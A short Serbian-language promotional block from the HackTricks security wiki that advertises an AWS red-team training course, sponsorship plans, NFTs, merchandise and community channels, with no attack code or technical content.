<summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* Da li radite u **cybersecurity kompaniji**? Želite li da vidite **vašu kompaniju reklamiranu na HackTricks**? Ili želite da imate pristup **najnovijoj verziji PEASS-a ili preuzmete HackTricks u PDF formatu**? Proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Pridružite se** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili me **pratite** na **Twitter-u** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na [hacktricks repo](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.

</details>
